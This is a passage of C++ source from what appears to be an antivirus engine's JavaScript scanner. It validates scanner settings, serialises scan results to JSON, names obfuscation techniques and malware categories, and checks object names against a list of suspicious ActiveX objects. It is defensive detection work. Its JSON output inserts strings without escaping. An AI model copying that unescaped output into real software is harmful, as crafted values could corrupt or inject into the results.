    }
    if (emulationTimeoutMs == 0 || emulationTimeoutMs > 60000) {
        return false;
    }
    if (scanTimeoutMs == 0 || scanTimeoutMs > 120000) {
        return false;
    }
    if (maxDeobfuscationDepth == 0 || maxDeobfuscationDepth > 256) {
        return false;
    }
    return true;
}

bool JSScanResult::ShouldBlock() const noexcept {
    return isMalicious || status == JSScanStatus::Malicious;
}

std::string JSScanResult::ToJson() const {
    std::ostringstream oss;
    oss << "{";
    oss << "\"status\":\"" << static_cast<int>(status) << "\",";
    oss << "\"isMalicious\":" << (isMalicious ? "true" : "false") << ",";
    oss << "\"riskScore\":" << riskScore << ",";
    oss << "\"threatName\":\"" << threatName << "\",";
    oss << "\"detectedFamily\":\"" << detectedFamily << "\",";
    oss << "\"sha256\":\"" << sha256 << "\",";
    oss << "\"scanDurationUs\":" << scanDuration.count() << ",";
    oss << "\"matchedSignatures\":[";
    for (size_t i = 0; i < matchedSignatures.size(); ++i) {
        if (i > 0) oss << ",";
        oss << "\"" << matchedSignatures[i] << "\"";
    }
    oss << "],";
    oss << "\"extractedIOCs\":[";
    for (size_t i = 0; i < extractedIOCs.size(); ++i) {
        if (i > 0) oss << ",";
        oss << "\"" << extractedIOCs[i] << "\"";
    }
    oss << "]";
    oss << "}";
    return oss.str();
}

std::string JSObfuscationDetails::ToJson() const {
    std::ostringstream oss;
    oss << "{";
    oss << "\"primaryType\":" << static_cast<int>(primaryType) << ",";
    oss << "\"entropyScore\":" << std::fixed << std::setprecision(2) << entropyScore << ",";
    oss << "\"confidence\":" << std::fixed << std::setprecision(2) << confidence << ",";
    oss << "\"suspiciousTokenCount\":" << suspiciousTokenCount << ",";
    oss << "\"deobfuscationLayers\":" << deobfuscationLayers << ",";
    oss << "\"fullyDeobfuscated\":" << (fullyDeobfuscated ? "true" : "false");
    oss << "}";
    return oss.str();
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

std::string_view GetJSEngineTypeName(JSEngineType type) noexcept {
    switch (type) {
        case JSEngineType::Unknown:       return "Unknown";
        case JSEngineType::JScriptWSH:    return "JScript/WSH";
        case JSEngineType::NodeJS:        return "Node.js";
        case JSEngineType::BrowserV8:     return "V8 (Chrome)";
        case JSEngineType::BrowserSpider: return "SpiderMonkey (Firefox)";
        case JSEngineType::BrowserJSC:    return "JavaScriptCore (Safari)";
        case JSEngineType::BrowserChakra: return "Chakra (Edge)";
        case JSEngineType::Electron:      return "Electron";
        case JSEngineType::PDF:           return "PDF JavaScript";
        default:                          return "Unknown";
    }
}

std::string_view GetJSObfuscationTypeName(JSObfuscationType type) noexcept {
    switch (type) {
        case JSObfuscationType::None:              return "None";
        case JSObfuscationType::EvalChain:         return "Eval Chain";
        case JSObfuscationType::StringSplitting:   return "String Splitting";
        case JSObfuscationType::CharCodeEncoding:  return "CharCode Encoding";
        case JSObfuscationType::UnicodeEscape:     return "Unicode Escape";
        case JSObfuscationType::HexEncoding:       return "Hex Encoding";
        case JSObfuscationType::OctalEncoding:     return "Octal Encoding";
        case JSObfuscationType::Base64:            return "Base64";
        case JSObfuscationType::JSFuck:            return "JSFuck";
        case JSObfuscationType::AAEncode:          return "AAEncode";
        case JSObfuscationType::JJEncode:          return "JJEncode";
        case JSObfuscationType::PackerCompression: return "Packer Compression";
        case JSObfuscationType::VariableRenaming:  return "Variable Renaming";
        case JSObfuscationType::ControlFlowFlatten:return "Control Flow Flattening";
        case JSObfuscationType::DeadCodeInjection: return "Dead Code Injection";
        case JSObfuscationType::Custom:            return "Custom";
        default:                                   return "Unknown";
    }
}

std::string_view GetJSThreatCategoryName(JSThreatCategory cat) noexcept {
    switch (cat) {
        case JSThreatCategory::None:            return "None";
        case JSThreatCategory::Downloader:      return "Downloader";
        case JSThreatCategory::Dropper:         return "Dropper";
        case JSThreatCategory::Ransomware:      return "Ransomware";
        case JSThreatCategory::RAT:             return "RAT";
        case JSThreatCategory::CryptoMiner:     return "CryptoMiner";
        case JSThreatCategory::InfoStealer:     return "InfoStealer";
        case JSThreatCategory::BrowserHijacker: return "BrowserHijacker";
        case JSThreatCategory::Adware:          return "Adware";
        case JSThreatCategory::ExploitKit:      return "ExploitKit";
        case JSThreatCategory::FormGrabber:     return "FormGrabber";
        case JSThreatCategory::Keylogger:       return "Keylogger";
        case JSThreatCategory::Reconnaissance:  return "Reconnaissance";
        case JSThreatCategory::Persistence:     return "Persistence";
        case JSThreatCategory::Worm:            return "Worm";
        default:                                return "Unknown";
    }
}

std::string_view GetJSScanStatusName(JSScanStatus status) noexcept {
    switch (status) {
        case JSScanStatus::Clean:             return "Clean";
        case JSScanStatus::Suspicious:        return "Suspicious";
        case JSScanStatus::Malicious:         return "Malicious";
        case JSScanStatus::ErrorFileAccess:   return "Error: File Access";
        case JSScanStatus::ErrorTimeout:      return "Error: Timeout";
        case JSScanStatus::ErrorInternal:     return "Error: Internal";
        case JSScanStatus::SkippedWhitelisted:return "Skipped: Whitelisted";
        case JSScanStatus::SkippedSizeLimit:  return "Skipped: Size Limit";
        default:                              return "Unknown";
    }
}

bool IsSuspiciousActiveXObject(std::string_view objectName) noexcept {
    std::string lower;
    lower.reserve(objectName.size());
    for (char c : objectName) {
        lower += static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
    }

    for (const auto& suspicious : SUSPICIOUS_ACTIVEX_OBJECTS) {
        if (lower.find(suspicious) != std::string::npos) {
            return true;
        }
    }
    return false;
}

}  // namespace Scripts
}  // namespace ShadowStrike
